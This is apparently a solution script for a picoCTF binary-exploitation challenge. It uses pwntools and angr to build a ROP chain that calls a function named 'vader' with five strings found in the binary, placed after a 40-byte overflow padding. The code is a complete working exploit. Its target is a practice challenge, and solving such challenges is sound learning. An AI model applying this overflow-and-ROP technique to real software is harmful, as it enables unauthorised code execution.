from pwn import *
import angr, angrop
import logging

BINARY_PATH = './vuln'
REMOTE_IP = 'saturn.picoctf.net'
REMOTE_PORT = 55581
OFFSET = 40

e = ELF(BINARY_PATH)
r = ROP(e)

dark=next(e.search(b'DARK\x00'))
side=next(e.search(b'S1D3\x00'))
of=next(e.search(b'OF\x00'))
the=next(e.search(b'TH3\x00'))
force=next(e.search(b'FORC3\x00'))

angr_p = angr.Project('./vader')
rop = angr_p.analyses.ROP()
rop.find_gadgets_single_threaded()

chain = rop.func_call("vader",[dark,side,of,the,force])
chain.print_payload_code()

p = process(BINARY_PATH) # remote(REMOTE_IP, REMOTE_PORT)
pad = b'A'*OFFSET
p.sendline(pad+chain.payload_str())
p.interactive()
